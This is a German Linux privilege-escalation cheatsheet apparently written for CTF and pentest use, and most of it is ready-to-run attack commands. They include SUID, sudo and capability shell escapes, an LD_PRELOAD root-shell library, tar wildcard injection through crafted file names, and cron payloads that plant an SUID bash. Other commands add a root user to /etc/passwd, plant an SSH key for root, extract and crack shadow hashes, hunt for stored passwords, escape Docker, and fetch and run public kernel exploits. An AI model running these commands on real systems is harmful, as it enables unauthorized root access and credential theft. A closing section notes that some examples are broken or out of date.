# 🐧 Linux-Rechteausweitung – vollständiges Cheatsheet

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Umfassender Leitfaden zur Rechteausweitung auf Linux-Systemen</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Bestandsaufnahme](#-bestandsaufnahme)
- [SUID/SGID](#-suidsgid)
- [Capabilities](#-capabilities)
- [Sudo ausnutzen](#-sudo-ausnutzen)
- [Cronjobs](#-cronjobs)
- [PATH Hijacking](#-path-hijacking-suchpfad-manipulieren)
- [NFS Root Squashing](#-nfs-root-squashing)
- [Kernel-Exploits](#-kernel-exploits)
- [Password Mining](#-password-mining-passwörter-aufspüren)
- [SSH-Schlüssel](#-ssh-schlüssel)
- [Beschreibbare Dateien](#-beschreibbare-dateien)
- [Docker Escape](#-docker-escape-container-verlassen)
- [Schnellübersicht](#-schnellübersicht)

---

## 🔍 Bestandsaufnahme

### Systeminformationen

```bash
# Hostname
hostname

# Betriebssystem und Kernel
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Architektur
arch
uname -m

# CPU-Informationen
cat /proc/cpuinfo
lscpu
```

### Benutzerinformationen

```bash
# Aktueller Benutzer
whoami
id

# Alle Benutzer
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Benutzergruppen
groups
cat /etc/group

# Angemeldete Benutzer
w
who
users

# Frühere Anmeldungen
last
lastlog

# Sudo-Berechtigungen
sudo -l
```

### Netzwerkinformationen

```bash
# IP-Adressen
ip a
ifconfig

# Routen
ip route
route -n

# Offene Ports
netstat -tulpn
ss -tulpn

# Aktive Verbindungen
netstat -an
ss -an

# ARP-Cache
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Hosts
cat /etc/hosts
```

### Prozesse und Dienste

```bash
# Laufende Prozesse
ps aux
ps -ef
ps aux | grep root

# Dienste
systemctl list-units --type=service
service --status-all

# Installierte Pakete
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Geplante Aufgaben

```bash
# Crontabs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Systemd-Timer
systemctl list-timers
```

---

## 🔐 SUID/SGID

### SUID-Programme finden

```bash
# SUID-Dateien finden
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# SGID-Dateien finden
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Beide Arten finden
find / -perm /6000 -type f 2>/dev/null
```

### Häufig ausnutzbare SUID-Programme

Ausnutzungsmöglichkeiten findest du in [GTFOBins](https://gtfobins.github.io/)!

#### **bash**
```bash
# Wenn bash das SUID-Bit trägt
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (alte Versionen)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**
```bash
# /etc/passwd kopieren, Root-Benutzer hinzufügen und zurückkopieren
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Capabilities

### Capabilities ermitteln

```bash
# Datei-Capabilities ermitteln
getcap -r / 2>/dev/null

# Häufig gefährliche Capabilities
# CAP_SETUID - UID ändern
# CAP_NET_RAW - Raw Sockets verwenden
# CAP_DAC_READ_SEARCH - Beliebige Dateien lesen
```

### Capabilities ausnutzen

#### **Python (cap_setuid)**
```bash
# Wenn python cap_setuid+ep besitzt
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Beliebige Dateien lesen
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Sudo ausnutzen

### Sudo-Berechtigungen prüfen

```bash
sudo -l
# Nach NOPASSWD-Einträgen suchen
# Nach Einträgen mit (ALL) oder (root) suchen
```

### Sudo ausnutzen

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Wenn sudo -l env_keep+=LD_PRELOAD anzeigt
# Manipulierte Bibliothek erstellen

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (interaktiv)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Legt die erste Zeile von shadow offen
```

### Schwachstellen bestimmter Sudo-Versionen

```bash
# Version prüfen
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Cronjobs

### Cronjobs finden

```bash
# Systemweite Crontab
cat /etc/crontab

# Cron-Verzeichnisse
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Benutzer-Crontabs
cat /var/spool/cron/crontabs/*

# Cron-Aktivitäten beobachten
# pspy zur Prozessbeobachtung verwenden
```

### Cronjobs ausnutzen

#### **Beschreibbares Cron-Skript**
```bash
# Wenn Cron ein Skript ausführt, das du verändern kannst:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Auf Cron warten, anschließend:
/tmp/bash -p
```

#### **Wildcard Injection (tar)**
```bash
# Wenn Cron Folgendes ausführt: tar czf /tmp/backup.tar.gz *

# Manipulierte Dateien erstellen
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **PATH ausnutzen**
```bash
# Wenn Cron einen relativen Pfad verwendet und du PATH kontrollierst
# Die Crontab enthält: PATH=/home/user:/usr/local/bin:...
# Das Skript ruft backup.sh auf (ohne vollständigen Pfad)

# Ersatzskript in einem beschreibbaren PATH-Verzeichnis erstellen
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a name="-path-hijacking-suchpfad-manipulieren"></a>

## 🛤️ PATH Hijacking (Suchpfad manipulieren)

### Anfällige Skripte finden

```bash
# Nach von Root ausgeführten Skripten mit relativen Pfaden suchen
# SUID-Skripte prüfen
# Cron-Skripte prüfen
# Systemd-Dienste prüfen
```

### PATH ausnutzen

```bash
# Wenn ein Root-Skript 'service' ohne vollständigen Pfad aufruft
# und du PATH kontrollierst:

# Manipuliertes 'service' erstellen
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Anfälliges Skript ausführen
./vulnerable_script
```

---

## 📁 NFS Root Squashing

### NFS-Freigaben finden

```bash
# Auf dem Rechner des Angreifers
showmount -e target_ip

# NFS-Exporte prüfen
cat /etc/exports
# Nach no_root_squash suchen
```

### no_root_squash ausnutzen

```bash
# Auf dem Rechner des Angreifers (als Root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Auf dem Zielsystem:
/share/bash -p
```

---

## 💣 Kernel-Exploits

### Kernel-Version prüfen

```bash
uname -r
uname -a
cat /proc/version
```

### Bekannte Kernel-Exploits

| CVE | Kernel-Version | Name |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Alle | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Herunterladen und kompilieren
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Herunterladen
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Zuerst die Kernel-Version prüfen
uname -r

# Herunterladen und kompilieren
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🔑 Password Mining (Passwörter aufspüren)

### Nach Passwörtern suchen

```bash
# In Dateien
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Konfigurationsdateien
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Verlaufsdateien
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Umgebung
env
printenv
```

### Passwortdateien

```bash
# Shadow-Datei (Root-Berechtigungen erforderlich)
cat /etc/shadow

# Passwort-Hashes aus shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Häufige Fundorte

```bash
# Webkonfigurationen
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Datenbankkonfigurationen
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Sicherungsdateien
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🔐 SSH-Schlüssel

### SSH-Schlüssel finden

```bash
# Private Schlüssel
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Autorisierte Schlüssel
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### SSH-Schlüssel ausnutzen

```bash
# Wenn ein lesbarer privater Schlüssel gefunden wurde:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Eigenen SSH-Schlüssel hinzufügen

```bash
# Schlüssel auf dem Rechner des Angreifers erzeugen
ssh-keygen -t rsa -b 4096

# Wenn du authorized_keys verändern kannst:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 📝 Beschreibbare Dateien

### Kritische beschreibbare Dateien

```bash
# Schreibberechtigungen prüfen
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Beschreibbare /etc/passwd ausnutzen

```bash
# Passwort-Hash erzeugen
openssl passwd -1 -salt hacker password
# Ergebnis: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Root-Benutzer hinzufügen
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Anmelden
su hacker
# Passwort: password
```

### Für alle beschreibbare Dateien finden

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Für alle beschreibbare Verzeichnisse
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐳 Docker Escape (Container verlassen)

### Docker-Umgebung erkennen

```bash
# Nach .dockerenv suchen
ls -la /.dockerenv

# Cgroups prüfen
cat /proc/1/cgroup | grep docker

# Hostnamen prüfen (zufällige Zeichenfolge)
hostname
```

### Eingebundener Docker-Socket

```bash
# Wenn docker.sock eingebunden ist
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Container über den Docker-Socket verlassen
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Privilegierter Container

```bash
# Wenn der Container privilegiert ist
fdisk -l                    # Datenträger des Hosts anzeigen
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Schnellübersicht

### Bestandsaufnahme mit Einzeilern

```bash
# Schnelle Systeminformationen
id; hostname; uname -a; cat /etc/issue

# Schnelle SUID-Suche
find / -perm -4000 -type f 2>/dev/null

# Schnelle Capability-Suche
getcap -r / 2>/dev/null

# Schnelle Sudo-Prüfung
sudo -l

# Schnelle Cron-Prüfung
cat /etc/crontab; ls -la /etc/cron*

# Schnelle Passwortsuche
grep -r "password" /home/ 2>/dev/null
```

### Automatisierte Werkzeuge

| Werkzeug | Beschreibung |
|------|-------------|
| **LinPEAS** | Umfassende Bestandsaufnahme |
| **LinEnum** | Linux-Bestandsaufnahme |
| **linux-smart-enumeration** | LSE |
| **pspy** | Prozessbeobachtung |

### Checkliste für schnelle Ansatzpunkte

- [ ] `sudo -l` – Sudo-Berechtigungen prüfen
- [ ] SUID-Programme – Finden und in GTFOBins nachschlagen
- [ ] Capabilities – `getcap -r / 2>/dev/null`
- [ ] Cronjobs – Beschreibbare Skripte?
- [ ] Kernel-Version – Bekannte Exploits?
- [ ] Lesbare /etc/shadow
- [ ] Beschreibbare /etc/passwd
- [ ] SSH-Schlüssel in /home/* oder /root
- [ ] Docker-Socket eingebunden
- [ ] NFS mit no_root_squash

---

## 📚 Ressourcen

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Verwandte Cheatsheets
- LinPEAS (ein eigener Leitfaden ist in dieser Kopie nicht vorhanden)
- [Windows-Rechteausweitung](../../Windows-PrivEsc/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Begriffe und Voraussetzungen:** SUID/SGID verändern beim Start geeigneter Programme die effektive Benutzer-/Gruppenkennung; sie garantieren keine Root-Shell. Linux ignoriert diese Bits bei Interpreter-Skripten. nosuid, no_new_privs und das Verhalten der gestarteten Shell können die Beispiele zusätzlich begrenzen. Capabilities sind einzeln vergebene Berechtigungen, keine pauschalen Root-Rechte. [Linux: execve](https://man7.org/linux/man-pages/man2/execve.2.html), [Linux: Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).
- **Fehlerhaftes cp-Beispiel und Schreibtests:** Im cp-Block wird die Befehlsersetzung innerhalb einfacher Anführungszeichen wörtlich geschrieben; außerdem wird die anschließend zurückkopierte temporäre passwd-Datei nicht aus dem Original initialisiert. Das Beispiel ist deshalb kein konsistenter Ablauf. Die Werte bleiben unverändert. Bei find bedeutet -writable „für den aufrufenden Benutzer beschreibbar“, nicht „für alle“. -perm -222 verlangt alle drei Schreibbits; -perm -o+w prüft das Schreibbit für andere. [Bash: einfache Anführungszeichen](https://www.gnu.org/software/bash/manual/html_node/Single-Quotes.html), [GNU Findutils: Modusbits](https://www.gnu.org/software/findutils/manual/html_node/find_html/Mode-Bits.html).
- **Sudo und historische Programme:** Zulässige Zielbenutzer, Argumente und Umgebungsregeln sind entscheidend. CVE-2019-14287 setzte eine passende Runas-Regel voraus, die ALL erlaubt und Root ausschließt; eine alte Versionsnummer allein reicht nicht. LD_PRELOAD wirkt nicht allein deshalb, weil die Variable genannt wird; der konkrete erlaubte Aufruf muss die Bibliothek tatsächlich laden. Die sudoedit-Zeile ist ein historischer Fehlerauslöser und kein vollständiger Root-Exploit. Nmaps alter --interactive-Modus wurde entfernt; Vims Python-Unterstützung hängt vom Build ab. [sudo: Änderungsprotokoll](https://github.com/sudo-project/sudo/blob/main/NEWS), [Linux: dynamischer Loader](https://man7.org/linux/man-pages/man8/ld.so.8.html), [Qualys: Baron Samedit](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt), [Nmap: Änderungsprotokoll](https://nmap.org/changelog.html), [Vim: Python-Unterstützung](https://vimhelp.org/if_pyth.txt.html).
- **CVE-Tabelle:** PwnKit betrifft polkits pkexec und Baron Samedit sudo, nicht den Kernel. Die Tabelle ist daher eine gemischte historische Übersicht. Ein Versionsname allein beweist keine Betroffenheit, insbesondere bei zurückportierten Distributionskorrekturen. Dirty Pipe wurde bereits in 5.16.11, 5.15.25 und 5.10.102 behoben; die obere Tabellenangabe ist keine inklusive Liste verwundbarer Versionen. [Qualys: PwnKit](https://www.openwall.com/lists/oss-security/2022/01/25/11), [Qualys: sudo](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt), [Entdeckerbericht: Dirty Pipe](https://dirtypipe.cm4all.com/), [Red Hat: Distributionskontext](https://access.redhat.com/security/vulnerabilities/RHSB-2022-002).
- **Cron, NFS und Docker:** Die Abläufe setzen passende Ausführungsrechte, eine beeinflussbare Datei beziehungsweise einen tatsächlich verwendeten Suchpfad voraus. no_root_squash hebt die übliche Abbildung von Client-Root auf eine anonyme Kennung auf; für das gezeigte Ergebnis müssen Export, Schreibzugriff und lokale Ausführungsbedingungen passen. Beim Docker-Socket sind Erreichbarkeit und Zugriffsrechte auf den zuständigen Daemon entscheidend; Rootless Docker und eingeschränkte Konfigurationen ändern die Voraussetzungen. Die Platzhalter für Datenträger und Pfade sind keine universell passenden Werte. [NFS: Exporte](https://man7.org/linux/man-pages/man5/exports.5.html), [Docker: Sicherheitsmodell](https://docs.docker.com/engine/security/).

---

<p align="center">
  <b>🐧 Root-Berechtigungen erlangen!</b><br>
  <i>Linux-Rechteausweitung gezielt beherrschen</i>
</p>
